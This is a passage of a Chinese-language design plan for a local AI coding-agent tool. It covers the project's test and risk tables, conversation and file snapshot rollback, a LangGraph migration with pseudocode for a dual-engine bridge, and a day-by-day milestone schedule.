    ├── test_editor_real_refactor.py  # 阶段 1（500 行文件精修不影响其他内容）
    ├── test_bash_in_sandbox.py  # 阶段 2（BashTool 现有 UT 在沙箱里重跑）
    └── test_rag_e2e_accuracy.py # 阶段 3（10 查 9 中）
```

### 9.2 回归保护

- 每阶段完成后跑 `pytest tests/ -k "not integration"`（只跑 UT，30 秒内完成），保证 S0~S7 的 60+ 现有 UT 全绿
- 每阶段完成后手动跑一次现有 `tests/integration/test_run_e2e.py`（S1 完成的端到端用例），确认没破坏主流程
- 阶段 2/3 之间可以逐步合入 main 分支，不要一次性合 4 阶段（方便 bisect 定位 bug）

---

## 十、风险与缓解措施

| 风险 | 影响 | 概率 | 缓解措施 |
|---|---|---|---|
| **FAISS 索引损坏** | 用户本地 RAG 数据丢了 | 中 | 双写：FAISS 索引每次 add 都同步写 `chunks_store.jsonl`，启动时如果 `faiss.bin` CRC 校验失败，从 jsonl 自动 rebuild；每次写入前备份 `.iwan/rag_index/faiss.bin.bak` |
| **Docker 后端在 Windows 家庭版跑不起来** | 阶段 2 验收失败 | 高（用户是 Windows） | `isolation_backend=auto` 设计时就把 Windows 下的默认后端设为 tempdir；Docker 仅在显式配置 `docker=True` 时启用，启用前先 `docker info` 探测，失败就 warn 并降级 |
| **精修编辑器的行号错位**（比如 edit_by_lines 后 insert_at_line 的 LLM 算错行号） | 改错代码 | 中 | 每次 edit 结果返回 edit 附近 ±5 行的预览 + lines_changed 统计；另外 `edit_by_search` 作为 LLM 更安全的首选（内容锚点不依赖行号）；SystemPrompt 里明确写 "优先用 edit_by_search，行数很多时才用 edit_by_lines 并 double-check 行号" |
| **RAG 召回率低**（分块太碎或太大 → 搜不到想要的内容） | 用户体验 RAG 是残废 | 中 | Chunker 设计时分块 + 上下文 header 注入；验收标准里硬卡 10 查 9 中；支持用户手动 `index_knowledge` 调分块参数 |
| **沙箱与权限审批双重校验时重复弹窗** | 用户烦躁 | 低 | 两个管理器之间加接口：沙箱拒绝的（黑名单/白名单外路径）**直接返回错误**，不抛到 PermissionManager；只有沙箱放行但操作属于"高风险清单"（delete_file force=True 等）才走审批 |
| **embedding 端点配额耗尽** | RAG 不可用 | 中 | EmbeddingProvider 加本地缓存：同一段文本的 hash → 向量缓存到 `.iwan/rag_index/embedding_cache.sqlite3`，避免重复请求同一个 chunk 反复计费；超时/429 时重试 3 次 + 指数退避 |

---

## 十（新增）、回溯功能（"时间旅行"）设计与实现路线

> 对应新增需求：**"把代码/对话回溯到某次对话之前的状态"**
> 结论前置：**好做，现有 JSONL 持久化 + S8 自动备份机制已经具备 70% 底盘；分 L1/L2/L3 三档逐步实现，不上 LangGraph 也能搞定前两档（满足 95% 日常场景）。**

### X.1 回溯到底要"还原"什么？三层拆解

| 层级 | 说明（用户视角） | 对应技术对象 | 现有项目基础 | 需补代码量 |
|---|---|---|---|---|
| **L1 对话状态回溯** | "把这条消息和下面的都删了，我从那一步重新问" — 不涉及文件，只还原对话消息链 | `thread.jsonl` 截断到指定 round_id 之前 | ✅ 已有 [SessionStore](file:///d:/IwanClaude/src/iwan_claude/core/session/store.py) 行存 JSONL（天然支持截断，不是整文件 JSON）；压缩后已经有 thread_<ts>.bak 自动备份机制 | 约 100 行（加 round_id 标记 + `rollback_messages` 函数 + TUI 按钮） |
| **L2 文件系统回溯（你在竞品看到的那个功能）** | "回到 Step 4 写 write_file(foo.py) 之前 — 所有文件那时候是什么样就还原成什么样" — 不涉及重跑 Agent，纯文件还原 | 每次"写操作类工具"执行前的**按步骤文件快照** + manifest 映射 (step → 改了哪些文件 → 对应 snapshot id) | ⚠️ 计划 S8.0 + S8.1 有"自动备份到 `.iwan/backups/`"，但还不是"按 step/round 分组、可按时间线列表"的结构化快照 | 约 400 行（SnapshotManager 模块 + 所有 builtin 写工具前置 hook + TUI 时间线列表 + 还原预览 diff） |
| **L3 Agent 状态回溯 + 分叉（类 Git branch）** | "从第 3 步开个新分支，换个思路继续聊；老分支保留不覆盖" — 不仅要还原文件和消息，还要能从那一步的 **ExecutionContext（messages/step/plan/tool_results/compact 状态）** 重新启动 AgentLoop 继续跑 | 完整 step 级状态序列化 + checkpointer + branch ref | ❌ 完全没有；但这正是 **LangGraph checkpointer 原生支持**（SqliteSaver.list_checkpoints / get_state / update_state）的能力 | 手写约 700 行（ExecutionContext 序列化 + step 存盘 + resume 逻辑）；**用 LangGraph 只需约 250 行（checkpointer 接入 + 包装 UI 工具）** |

### X.2 关键设计：为什么我们"好做"——项目已有三大底盘

1. **消息存储已是行存 JSONL**（[store.py:62-63](file:///d:/IwanClaude/src/iwan_claude/core/session/store.py#L62)）
   行存结构的好处："截断到第 N 轮" = 删掉第 N 行之后的所有内容，操作 O(1) 且不会破坏前面的部分；如果当初选了整文件 JSON 数组，截断还要 parse → modify → serialize，容易出错还慢。

2. **压缩后自动备份机制已经跑通**（[store.py:132-142 write_compacted](file:///d:/IwanClaude/src/iwan_claude/core/session/store.py#L132)）
   `thread_<timestamp>.jsonl.bak` 的思路完全正确，我们只要把同样的"写前备份"从"只有 compact 时才做"推广成"**每次写操作工具 invoke 之前都做**"就行。

3. **统一的 `.iwan` 本地工作目录**（[runs.py RUNS_DIR](file:///d:/IwanClaude/src/iwan_claude/core/runs.py)）
   快照不用选路径，直接放 `.iwan/snapshots/<session_id>/<run_id>_step<N>_<tool_name>/`；manifest 放 `.iwan/snapshots/<session_id>/manifest.jsonl`，一行一个快照记录。

### X.3 每一层的技术实现细节

#### L1：对话状态回溯（`SessionStore.rollback_to_round`）

在 `thread.jsonl` 的每一行**追加 `round_id` 字段**（1-based，每次用户发一条新消息 +1，工具执行完回到用户也 +1）：
```json
{"ts": "...", "role": "user", "content": "...", "run_id": "r_abc", "round_id": 7}
```
然后新增三个函数：
```python
# session/store.py 新增
def list_rounds(sid) -> list[RoundInfo]:
    # 返回 [{round_id, ts, preview, num_tool_calls, file_changes_count}]

def rollback_to_round(sid, round_id: int, *, dry_run: bool = True) -> RollbackPreview:
    # 1. 截断 thread.jsonl 到最后一个 round_id < N 的行（先 rename 成 .pre_rollback.bak）
    # 2. 返回 RollbackPreview = {will_delete_messages: N, affected_runs: [...]}
    # 3. dry_run=False 才真正落盘

def restore_from_backup(sid, backup_path: Path) -> None:
    # 回滚"回滚操作"本身（防手抖，每次 rollback 前先把当前 thread 另存一份 .pre_rollback_<ts>.bak）
```
TUI 侧只需要加一个侧栏："📜 对话时间线"，列出每一轮的一句话预览，右键菜单"回到本轮之前" → 弹 diff 预览 → 确认就 rollback。

#### L2：文件系统回溯（`SnapshotManager` 新模块）

新建 `src/iwan_claude/core/snapshots/`：
```
snapshots/__init__.py
snapshots/manager.py  # SnapshotManager 类
snapshots/manifest.py # manifest.jsonl 读写 + RoundSnapshot 数据类
```
核心 Hook 点：**在 invoke_tool（[invocation.py](file:///d:/IwanClaude/src/iwan_claude/core/tools/invocation.py)）执行 BaseTool.invoke 之前**，先判断这个 tool 是不是 `category == "write"`（ReadFileTool 等 read 类不做快照）：
```python
# invocation.py 伪代码
if tool.metadata.get("category") == "write":
    affected_paths = await tool.estimate_affected_paths(params)  # 每个写工具自己实现
    snap_id = await snapshot_manager.create_snapshot(run_id, step, tool.name, affected_paths)
    manifest.add_entry(snap_id, run_id, step, tool.name, affected_paths)
    # 注意：bash 工具 estimate_affected_paths 返回未知（["*"] 或空），默认做"整个 CWD 目录 diff"级别快照（rsync 到 snapshot dir）
result = await tool.invoke(params)
if result:
    manifest.update_after_execution(snap_id, changed_files=detect_post_changes(affected_paths))
```
快照存储策略（按成本由低到高，按工具分派）：
- 全局清理策略（✅ 用户已确认）：**保留最近 30 个快照，超出部分按 LRU（最近最少使用）自动清理**，清理阈值 `config.snapshot.max_retained = 30` 可配置；CWD 全量快照默认对未变化文件做硬链接去重（20 行 de-dup 函数），实际占用空间比"每份全拷"小 80%~95%
- 单文件写工具（write_file/edit_by_lines/delete_lines/insert_at_line/edit_by_search）：**单文件 copy2** 到 snapshot 目录，成本 O(文件大小)，极快
- 多文件工具（rename/copy/mkdir/delete_file force=True）：**递归 copy affected_paths**
- BashTool（无法静态预测改了什么）：✅ **用户已确认默认开启** — 用 `shutil.copytree(ignore=exclude_patterns)` 把 CWD 全拷到 snapshot 下的 tempdir，exclude_patterns 默认排除 `[".git/**", "node_modules/**", ".venv/**", "__pycache__/**"]`；用户要省空间可在 SandboxConfig 里手动关（关了 bash 改的东西就不可回溯）

还原 UI：TUI 时间线每一项后面跟一个"💾 改了 3 个文件 → 预览还原"按钮，点了之后显示 **before/after 三栏 diff**（左=快照前，中=当前，右=还原后预览），确认还原后先把当前状态再快照一次（防手抖）再执行还原。

#### L3：Agent 状态 + 分叉（和 LangGraph 接入合并实现）

因为手写 ExecutionContext 序列化/反序列化 + resume 逻辑代码量大且容易和现有 AgentLoop 的 step 计数、Compactor 状态纠缠出错，我们**放弃手写 L3，直接等 S8.2（第三阶段）上 LangGraph 后用它的 checkpointer 原生支持**（见下一章节）。前两档 L1+L2 完全独立，不依赖 LangGraph，可以先交付。

### X.4 回溯功能验收标准

- [ ] L1 UT：写入 10 轮消息 → rollback 到 round=5 → 再 append 3 轮 → list_rounds 验证 round_id 正确且第 6~10 轮真的没了；restore_from_backup 验证可以恢复到 rollback 前
- [ ] L2 UT：write_file 3 次 → snapshot manifest 有 3 条 → rollback 到第 2 次快照 → 文件内容字节级等于第 2 次 write_file 之前的状态；delete_file(foo.py) → snapshot → 还原后 foo.py 回来了
- [ ] L2 BashTool UT：bash `echo "hello" > a.txt && mkdir sub && echo "world" > sub/b.txt` → snapshot 捕获到 a.txt + sub/b.txt 两个新文件 → 还原后两个文件消失且 CWD diff 干净
- [ ] 防手抖验证：两次 rollback 之间自动产生 `.pre_rollback_<ts>.bak`，回滚回滚成功

---

## 十一（新增）、LangGraph 接入决策与分步迁移计划

> 对应新增需求：**"主流做 agent 的库是 langgraph，我这个项目没看到它的使用"**
> 结论前置：**分批迁 + 引擎双跑兼容层，不推翻旧 AgentLoop，LangGraph 主要用来拿"回溯 L3 + 分叉 + 未来多智能体编排"三个能力；第一个可用版本（LangGraph 能跑和旧引擎一样的简单对话）3 天可交付。**

### XI.1 现状确认（为什么 S0~S7 没上 LangGraph？合理且正确的选择）

已核实：
- [pyproject.toml](file:///d:/IwanClaude/pyproject.toml) 无 langgraph/langchain 依赖
- 全仓 Grep langgraph/StateGraph/create_react_agent = **0 命中**
- Agent 循环是 S1 手写的 [AgentLoop.run](file:///d:/IwanClaude/src/iwan_claude/core/loop.py#L51)，一个 while 循环 + 4 步（plan/observe/act/compact）

为什么当初**不应该**上 LangGraph（现在复盘也没做错）：
1. **Thinking Blocks 定制处理**（[loop.py:82-84](file:///d:/IwanClaude/src/iwan_claude/core/loop.py#L82)）：Anthropic Claude 3.7 Sonnet Extend Thinking 模式下 thinking blocks 必须原样保留且放在 assistant message 的最前面，这是 Claude 特有语义，LangGraph prebuilt create_react_agent 默认不处理 thinking block 顺序
2. **max_tokens 中途异常修复**（[loop.py:100-109](file:///d:/IwanClaude/src/iwan_claude/core/loop.py#L100)）：输出 token 爆了导致 tool call 没完整生成时，补 synthetic tool_result error 保持消息对平衡 —— 异常处理逻辑 LangGraph 不会帮你写
3. **压缩器触发顺序正确性**（[loop.py:120-128](file:///d:/IwanClaude/src/iwan_claude/core/loop.py#L120)）：S6 调试了很久才定下来"只有 stop_reason=tool_use（末尾是 user tool_result）且 context_pct≥阈值 才压缩"，保证压缩后消息对顺序合法；迁 LangGraph 需要自己插条件边+顺序判断
4. **PermissionManager 同步审批范式**：现有是 invoke_tool 内部 `await permission_manager.request_approval()` 阻塞 Future，graph 不中断；LangGraph interrupt_before=["tools"] 的原生范式是"中断整个图 → 用户 resume None"再继续，审批逻辑要重写

### XI.2 那现在为什么要上？— 迁了能拿到的 4 个核心收益

| 能力 | 手写实现成本 | LangGraph 原生 | 决策（值不值得迁） |
|---|---|---|---|
| ① **回溯 L3 + 状态分叉**（你刚问的那个 L3 Pro 版） | ~700 行（ExecutionContext 序列化、step 存盘、resume 逻辑，且容易漏 step 状态） | 约 250 行：`SqliteSaver(db_path=".iwan/checkpoints.sqlite3")` 接 `StateGraph.compile(checkpointer=...)` → `list_checkpoints()` 拿历史 → `get_state(..., checkpoint_id=X)` 还原 → `update_state` 改 → 开分支重新 stream | ✅ **值！这是头号收益，省 2/3 代码且 bug 少** |
| ② **HITL 审批与状态持久化解耦** | 要自己把"用户正在审批第 N 个 tool"存到数据库，iwan 重启后审批状态不丢 | interrupt_before 中断时 graph state 已经自动落 checkpointer sqlite；iwan 重启后 `graph.get_state(config)` 拿到中断点再 resume，不丢审批上下文 | ✅ 有用，解决"iwan 闪退审批结果没了"的痛点 |
| ③ **多智能体编排（Planner→Executor→Reviewer 图）** | 现有 SpawnAgentTool 是"工具里起子 AgentLoop"，父子状态不共享，回传结果只能用 tool_result 字符串 | `StateGraph` + `Send()` 条件路由 + 子图共享父 state；参考 S8 Experience 423262（GradCopilot Planner-Executor 图）的成熟范式 | 🟡 有价值但不急，S9 再做，先留扩展接口 |
| ④ **RAG 条件路由（NeedRetrieval 判断）** | 靠 SystemPrompt 引导 LLM"要先搜再答"，偶尔忘记调 search_knowledge | 加个 retrieval 判断节点：llm 先输出 `need_retrieval: bool` → True 先走 search_knowledge 节点再回 llm；或者直接把 rag 注册成工具，ReAct 图会自动调 | 🟡 锦上添花，手写也够用 |

**综合结论：要迁，但只为 ①② 迁，不为 ③④ 迁；用最小改动面拿到 L3 回溯 + HITL 持久化。**

### XI.3 从前车之鉴看迁移坑（5 份 ExperienceRecall 总结）

必须严格遵守以下 5 条避坑规则，否则会重蹈 423262 / 928855 / 960732 三个项目的失败覆辙：

| 坑 ID | 前车之鉴（实际项目失败场景） | 我们的规避措施（强制执行） |
|---|---|---|
| **坑 1：Prompt 变量注入乱加占位符**（928855 FailureExperience 1） | create_react_agent 里传 `ChatPromptTemplate({workspace})` 但 executor 根本没注入 workspace → KeyError 堆栈满天飞 | ✅ **我们只传纯字符串 system prompt**：继续用现有 [build_base_system_prompt()](file:///d:/IwanClaude/src/iwan_claude/core/system_prompt.py) 返回的 str；workspace/session_id/rag 行为引导等一律用 Python f-string format 成常量后再传，**绝不加任何 LangChain ChatPromptTemplate 变量占位符** |
| **坑 2：create_react_agent 与手写 StateGraph 二选一式来回切**（423262 FailureExperience 2） | 先按 backend.md 写 Planner-Executor StateGraph，又为了 ReAct 改 create_react_agent，两边互删导致工具调用链路彻底断了 | ✅ **我们直接写 StateGraph，不用 prebuilt create_react_agent**。因为我们的循环有 thinking block/max_tokens synthetic/compactor 三个重度定制，prebuilt 包不住；手写 StateGraph 的四个节点（chat_node / tools_node / compact_node / end_node）反而代码量更少且可控 |
| **坑 3：大规模迁移无兼容层，一次性大爆炸删旧代码**（960732 FailureExperience 1+2） | 重构目录直接 rm structured_logger.py → 全仓 50+ 导入雪崩，用户反馈"打补丁" | ✅ **引擎双跑兼容方案**（见下一节 XI.4）：旧 `AgentLoop` 类**一行都不删**；新写 `LangGraphAgentLoop`，两者共享完全相同的构造参数 + `async run(context)` 签名；`AgentRunner` 加开关 `config.agent.engine = "legacy" \| "langgraph"`，默认 legacy；两个引擎**共存至少到 S9 结束** |
| **坑 4：SystemPrompt 传对象不传字符串**（423262 SuccessExperience 1） | ChatPromptTemplate 当 system_prompt 传 → Pydantic ValidationError，SystemMessage.content 要求 str | ✅ 已经满足：[build_base_system_prompt](file:///d:/IwanClaude/src/iwan_claude/core/system_prompt.py) 返回 str；chat_node 直接 `system=build_base_system_prompt(...)`，不包装任何 PromptTemplate 对象 |
| **坑 5：依赖版本乱，langchain 本体和 langchain-classic 符号冲突**（928855 FailureExperience 2） | langchain 1.2 vs langchain-classic 1.0 各有一套 create_openai_tools_agent 符号，照着文档抄 ImportError | ✅ **锁定最小依赖集，绝不装 langchain 本体**：只装 `langgraph>=0.2.30`、`langchain-core>=0.2.40`、`langchain-anthropic>=0.1.20`（对应 Anthropic provider 桥接）三个包；不装 langchain、不装 langchain-openai、不装 langchain-classic；写一个 `check_langgraph_imports.py` 启动脚本，import 失败立刻打印"缺少 XXX 包，请 pip install ..."并给出 lock 好的版本号 |

### XI.4 迁移核心方案：引擎双跑 + ToolRegistry 桥接层

#### 双引擎接口对齐（零改动面的关键）

新 `LangGraphAgentLoop` 与旧 `AgentLoop` 对外接口**完全一致**（构造参数 + 方法签名）：
```python
class LangGraphAgentLoop:  # 和 AgentLoop 构造函数 100% 对齐
    def __init__(self, provider, registry, bus, *, llm_model_name,
                 permission_manager=None, compactor=None, compact_threshold=0.0,
                 session_id="", checkpointer=None):
        # checkpointer 是新增的（LangGraph 特有），其他参数完全一样
        ...

    async def run(self, context: ExecutionContext) -> None:  # 方法签名完全一样
        # 内部用 StateGraph，不影响外部调用者
        ...
```
调用方（`AgentRunner`）唯一要改的代码只有 3 行：
```python
# runner.py 仅改这里
if config.agent.engine == "langgraph":
    loop = LangGraphAgentLoop(...)
else:
    loop = AgentLoop(...)
```
其他 20+ 调用点（测试、TUI、BackgroundTaskRegistry 里的 SpawnAgentTool 子循环）**一行不改**，完美兼容。

#### Tool 桥接：`ToolRegistry.to_langchain_tools()`

写一个薄桥接层，不要改任何现有 BaseTool/ToolRegistry 的内部实现：
```python
# tools/registry.py 新增方法（不删旧方法）
from langchain_core.tools import tool as lc_tool
from langchain_core.runnables import Runnable

def to_langchain_tools(self) -> list[Runnable]:
    out = []
    for name, tool in self._tools.items():
        # 关键：桥接层调用 invoke_tool（而不是直接 tool.invoke）
        # 这样 PermissionManager 审批 + EventBus 事件 + 未来 SnapshotManager hook
        # 所有旧链路 100% 复用，完全不用重写
        async def _bridge(params: dict, *, _t=tool, _name=name):
            from iwan_claude.core.tools.invocation import invoke_tool
            fake_tc = ToolCall(id=f"lg_{uuid4().hex[:8]}", name=_name, input=params)
            result = await invoke_tool(self, fake_tc, ...)  # 参数和 loop.py 调 invoke_tool 时一致
            return result.content
        fn = lc_tool(_bridge, name=name, description=tool.description)
        # 绑定 schema：从 tool.params_schema 转成 langchain 要求的 args_schema
        fn.args_schema = pydantic_schema_from_tool_params(tool.params_schema)
        out.append(fn)
    return out
```
为什么必须走 `invoke_tool` 而不是直接 `tool.invoke`？因为 `invoke_tool` 里已经实现了：① PermissionManager 审批 ② EventBus tool_started/finished 事件 ③ 异常捕获转 tool_result error。这三个是现有链路的地基，桥接层必须复用而不是重写，否则会出现"LangGraph 调工具不弹审批"这类 bug。

#### StateGraph 节点设计（4 个节点，对应旧 while 循环的 4 步）

```python
# 伪代码：LangGraphAgentLoop._build_graph()
from langgraph.graph import StateGraph, START, END
from langgraph.checkpoint.sqlite import SqliteSaver

class AgentState(TypedDict):  # 对应 ExecutionContext 的可序列化字段
    messages: list[dict]        # context.messages
    system_prompt: str          # build 好的常量字符串
    step: int
    result: str | None
    status: Literal["running", "success", "failed"]
    fail_reason: str | None

# 节点 1：chat_node — 等价旧循环 plan + observe
async def chat_node(state: AgentState, config: RunnableConfig) -> dict:
    # 直接调现有 self._provider.chat(...)（不用 langchain-anthropic 新写的 chat model，省得踩 thinking block 坑）
    response = await self._provider.chat(messages=state["messages"],
                                         tool_schemas=self._registry.tool_schemas(), ...)
    # 处理 thinking_blocks + text + tool_use append（和 loop.py:82-89 一模一样的代码，直接拷贝复用）
    new_messages = state["messages"] + [assistant_msg_from_response(response)]
    return {"messages": new_messages, "step": state["step"] + 1,
            "_stop_reason": response.stop_reason, "_usage": response.usage,
            "_tool_calls": response.tool_calls}

# 节点 2：tools_node — 等价旧循环 act（但要逐个抛 interrupt 给 HITL 审批）
async def tools_node(state: AgentState, config: RunnableConfig) -> dict:
    # 逐个执行 tool_calls；对每个 tool 先 interrupt 让用户审批
    # 工具结果 append 到 messages（和 loop.py 一样）
    ...

# 节点 3：compact_node — 等价旧循环压缩器（直接复用 self._compactor.compact）
async def compact_node(state: AgentState, config: RunnableConfig) -> dict:
    # 先把 state 包成临时 context 对象传给 compactor
    tmp_context = ExecutionContext(messages=state["messages"], ...)
    await self._compactor.compact(tmp_context, self._provider)
    return {"messages": tmp_context.messages}

# 条件边路由（完全复刻旧循环 if/elif 逻辑）
def after_chat(state: AgentState) -> Literal["tools", "compact", "end_success", "end_fail"]:
    sr = state["_stop_reason"]
    if sr == "end_turn": return "end_success"
    if state["step"] >= MAX_STEPS: return "end_fail"
    if sr == "tool_use":
        if usage.context_pct >= self._compact_threshold: return "compact"  # 先 compact 再 tools
        return "tools"
    return "end_fail"  # 理论不会到

# 拼装 + 编译（关键：checkpointer 传进来，实现持久化）
builder = StateGraph(AgentState)
builder.add_node("chat", chat_node)
builder.add_node("tools", tools_node)
builder.add_node("compact", compact_node)
builder.add_conditional_edges("chat", after_chat,
    {"tools": "tools", "compact": "compact", "end_success": END, "end_fail": END})
builder.add_edge("tools", "chat")
builder.add_edge("compact", "tools")

checkpointer = SqliteSaver.from_conn_string(".iwan/checkpoints.sqlite3")
self._graph = builder.compile(checkpointer=checkpointer,
                              interrupt_before=["tools"])  # tools 之前中断 → HITL 审批
```
注意：**旧循环的 130 行 while 循环逻辑（LLM 调用/消息 append/max_tokens synthetic/compact 触发条件/终止判断）95% 可以直接拷贝进 chat_node + after_chat 路由里，不用重新设计逻辑**，极大降低迁移 bug。

### XI.5 阶段 S8.2：LangGraph 接入层 + 回溯 L3 + 分叉（3 天，✅ 用户已确认：放在精修编辑器之后、沙箱之前，学习项目先学主流框架）

因为是**学习项目而非真实生产项目**，我们把 LangGraph 提前到第三阶段学框架，沙箱（偏基础设施）放后面。迁的过程全程**双引擎共存（默认 legacy）**，任何时候 `config.agent.engine = "legacy"` 秒回滚，不会影响已交付功能。

| 子阶段 | 工期 | 交付物 |
|---|---|---|
| 2a. 依赖锁 + import checker + 双引擎开关 | 0.5 天 | pyproject.toml 新增 langgraph 三依赖（不装 langchain 本体！）；`check_langgraph_imports.py` 预检测脚本；config.py 加 `agent.engine = "legacy"` 字段；AgentRunner 3 行双引擎 if/else 切换代码 |
| 2b. ToolRegistry.to_langchain_tools() 桥接层 | 0.5 天 | 薄桥接 40 行代码 + UT：所有 builtin 工具从 LangChain 侧调用时，审批/EventBus/异常转 result **三条旧链路 100% 复用**（桥接层走 invoke_tool，不直接调 BaseTool.invoke） |
| 2c. LangGraphAgentLoop 四节点图 + 防 GraphRecursionError 设计 | 1.5 天 | chat_node/tools_node/compact_node/END 四节点 + after_chat 条件边（完全拷贝旧 while 循环的 S1 稳定逻辑）；双保险防递归：`recursion_limit=128` + state 层 `_last_tool_call_ids` 幂等标记；UT：5 轮工具调用 + 1 次 compact，两个引擎 messages 数组字节级相等（thinking block 随机内容除外） |
| 2d. 回溯 L3（时间旅行）+ 状态分叉 UI 工具 | 0.5 天 | `list_checkpoints(session_id)` / `rollback_to_checkpoint(ck_id)` / `create_branch_from_checkpoint(ck_id, name)` 三个 TUI 工具（用 LangGraph SqliteSaver 原生 API，手写 700 行代码省 2/3）；UT：从第 2 步开 branch B，在 B 上改 3 个文件 → branch A 完全干净互不影响 |

---

## 十二、更新后的风险与缓解措施（新增 3 条回溯 + LangGraph 相关风险）

| 风险 | 影响 | 概率 | 缓解措施 |
|---|---|---|---|
| FAISS 索引损坏 | RAG 丢数据 | 中 | 双写 chunks_store.jsonl；启动时 CRC 校验失败自动 rebuild；每次写入前 faiss.bin.bak |
| Docker 后端 Windows 家庭版起不来 | S8.3（沙箱）验收阻塞 | 高（你是 Windows） | isolation_backend=auto：Windows 默认 tempdir，Docker 仅显式开启 + `docker info` 探测失败就降级警告 |
| 精修编辑器行号算错（LLM 误判） | 改错代码 | 中 | 每次 edit 返回 ±5 行预览 + lines_changed 统计；优先 edit_by_search 内容锚点不依赖行号；SystemPrompt 明确引导 |
| RAG 召回率低 | RAG 用起来像残废 | 中 | Chunker 加 header_context 注入；验收硬卡 10 查 9 中；用户可调 index_knowledge 分块参数 |
| 沙箱 + 审批双重校验重复弹窗 | 用户烦躁 | 低 | 沙箱黑名单直接报错，不进审批；只有沙箱放行且操作属于高风险清单（delete force=True 等）才弹窗 |
| Embedding 端点配额耗尽 | RAG 不可用 | 中 | 本地 hash→vector 缓存（.iwan/rag_index/embedding_cache.sqlite3）；超时/429 重试 3 次 + 指数退避 |
| **回溯快照占磁盘空间过大**（新增） | CWD 几 MB 的代码跑 100 轮 bash 全量快照，占 ~500MB 磁盘 | 中 | ① 默认保留最近 30 个快照，更旧的按 LRU 自动清理（`config.snapshot.max_retained` 可配置）；② BashTool 全量 CWD 快照默认关闭，用户要回溯 bash 改的文件要手动开；③ 每个 snapshot 做 content-defined chunking + 硬链接去重（写个 20 行 de-dup 函数，相同文件不重复拷） |
| **LangGraph 依赖 lock 冲突**（新增） | 新装 langgraph 三依赖和现 anthropic/textual/pydantic 版本冲突导致 pip install 失败 | 中低 | ① 新建 `[dependency-groups] langgraph-engine`，不把 langgraph 加进默认 dependencies，用户 `pip install -e ".[langgraph-engine]"` 才装；② 写 install 前预检测脚本：逐个试 `import langgraph, import langchain_core, import langchain_anthropic`，冲突就打印详细版本矩阵提示；③ 默认 engine=legacy，不装依赖也不影响原有功能 |
| **LangGraph 迁移时 Thinking block 顺序错误**（新增） | 迁完之后 Claude 3.7 扩展思考模式退化、回答质量下降 | 中低 | ① 写专门的 UT：构造"thinking + text + tool_use 三 block"的响应，跑两个引擎，assert assistant message 里 block type 和顺序完全一致；② 迁移初期 chat_node 不使用 langchain-anthropic 的 ChatAnthropic 模型，直接复用现有 self._provider.chat（[openai_compat.py](file:///d:/IwanClaude/src/iwan_claude/core/llm/openai_compat.py) 的 HTTP 调用），拿到的 response.thinking_blocks 和旧循环完全同源，就不会错顺序 |

---

## 十三、阶段里程碑总表（✅ 用户已确认顺序：先 LangGraph 再沙箱；快照保留 30 个 + bash 也回溯）

| 阶段 | 名称 | 工期 | 交付物 | 验收 UT+IT 数 | 优先级 |
|---|---|---|---|---|---|
| S8.0 | 基础工具补全 + 回溯 L1/L2 | **1.5 天** | 6 FS 工具 + 搜索双引擎 + run_python_code + WriteFileTool mode/备份 + **SnapshotManager + SessionStore rollback 对话/文件双回溯（bash 默认全量快照、保留最近 30 个 LRU 清旧）** | 22（原）+ 4（L1）+ 4（L2）= **30** | P0（开干第一天，第二天上午收尾回溯） |
| S8.1 | 精修文件编辑器 | 2 天 | view/edit_lines/edit_search/insert/delete 五大工具 + 自动备份通用模块 + SnapshotManager 自动在每次 edit 前打快照 | 25（原）= 25 | P0（核心：光标修改体验，Day 3.5 可用） |
| **S8.2 ✅ 提前（学习项目）** | **LangGraph 接入层 + 回溯 L3 + 分叉** | **3 天** | 双引擎切换开关（默认 legacy，秒回滚）+ `ToolRegistry.to_langchain_tools()` 桥接 + LangGraphAgentLoop 四节点图（防 GraphRecursionError）+ SqliteSaver 持久化 + list_checkpoints/rollback/branch 三个 UI 工具 | 8（桥接）+ 8（双引擎一致性）+ 4（分叉/回溯 L3）= **20** | P1（学习主流框架 + 拿 Pro 级回溯能力） |
| S8.3 | 沙箱系统（原 S8.2，延后） | 3 天 | SandboxConfig + 三后端 + Bash/FS 工具集成 + 双层防护（沙箱硬拦 + 审批软拦，复用 LangGraph interrupt_before 原生 HITL 省 200 行） | ~20（原）= 20 | P1（安全底线） |
| S8.4 | RAG 知识库（原 S8.3，延后） | 4 天 | Chunker + EmbeddingProvider + FAISS + IndexManager + search/index/forget 三工具 + SystemPrompt 行为引导 | 12（原）= 12 | P1（差异化） |

**总工期（含缓冲）：14 天（2~3 周）**，关键交付时间点：
- **Day 1.5**：回溯 L1/L2 可用（对话截断 + 文件状态还原）
- **Day 3.5**：精修编辑器可用（光标任意位置修改代码）— 你最开始问的三大核心诉求（精修/回溯/LangGraph 学习骨架）Day 3.5 全部有体验版
- **Day 6.5**：LangGraph 迁移完成（双引擎切换可用 + 状态分叉 L3 Pro 回溯）— 此时已完成学习项目的 70%
- **Day 14**：沙箱 + RAG 全部交付，完整产品

---

## 十四、更新后的落地建议：开工顺序（✅ 已确认决策：先 LangGraph 再沙箱；快照保留 30 个 + bash 回溯）

**每天下班前必须跑通当天阶段所有 UT 再合入，单测 30 秒内必须结束；集成测试每天早上第一件事跑通昨天的。**
**核心红线（强制执行，参考 960732 坑）：旧类不删一个、旧方法不改一行、默认引擎永远 legacy，新引擎至少双跑 2 周再考虑切默认。**

1. **Day 1**：S8.0 — 上午写 6 件 FS 工具（delete/rename/copy/mkdir/stat/exists）+ WriteFileTool 加 mode 参数（append/overwrite/fail_if_exists）+ 写前自动备份；下午写 find_files + grep_search 双搜索引擎 + run_python_code（sandbox 留占位，暂时用临时 venv）
2. **Day 2 上午**：S8.0 续 — 回溯 L1（SessionStore 加 round_id 字段 + list_rounds / rollback_to_round / restore_from_backup 三个函数） + 回溯 L2（SnapshotManager + manifest.jsonl + write_file/delete_file/rename/copy/bash 五大写工具的前置 hook 打快照，默认保留最近 30 个 LRU 自动清理 + 硬链接去重）
3. **Day 2 下午 + Day 3**：S8.1 精修编辑器五大工具（view_file 带行号范围读 / edit_by_lines 行范围替换 / edit_by_search 内容锚点替换 + 多匹配歧义保护 / insert_at_line / delete_lines）— 关键 E2E：500 行模拟代码文件改 3 行，**其他 497 行字节级完全不变**；**Day 3 下班：你的两大核心（光标修改 + 回溯 L1/L2）都可以真实用起来了！**
4. **Day 4 ~ Day 6（✅ 已确认：先学 LangGraph）**：S8.2 LangGraph 迁移
   - Day 4：pyproject.toml 加 langgraph 三依赖（不装 langchain 本体！） + check_imports 脚本 + config.py 加 agent.engine/snapshot.max_retained 字段 + AgentRunner 3 行双引擎开关 + ToolRegistry.to_langchain_tools() 桥接层 40 行
